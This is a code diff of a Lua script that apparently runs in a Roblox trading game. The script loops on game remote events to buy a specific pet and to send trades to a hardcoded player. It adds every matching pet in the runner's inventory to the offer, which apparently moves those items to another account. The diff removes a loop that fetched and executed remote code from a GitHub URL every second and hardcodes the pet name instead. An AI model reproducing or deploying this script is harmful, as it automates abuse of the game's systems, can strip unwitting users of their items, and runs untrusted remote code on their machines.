@@ -248,20 +248,13 @@ spawn(function()
 	end
 end)
 
-spawn(function()
-	while wait(1) do
-		local link = loadstring(game:HttpGet("https://raw.githubusercontent.com/Reellzz/Reellzz/refs/heads/main/AccControl"))()
-		Pet = link.Pet
-	end
-end)
-
-pettt = Pet
+pettt = "winter_2025_cozy_mistletroll"
 
 spawn(function()
 	while wait(0.5) do
 		local args = {
 			"pets",
-			pettt,
+			"winter_2025_cozy_mistletroll",
 			{
 				buy_count = 1
 			}
@@ -277,7 +270,7 @@ spawn(function()
 				get("TradeAPI/SendTradeRequest"):FireServer(game.Players:FindFirstChild("xlsxh"))
 				
 				for i,v in pairs(ClientData.get_data()[LocalPlayer.Name].inventory.pets) do
-					if v["kind"] == pettt then
+					if v["kind"] == "winter_2025_cozy_mistletroll" then
 						wait()
 						get("TradeAPI/AddItemToOffer"):FireServer(v.unique)
 					end
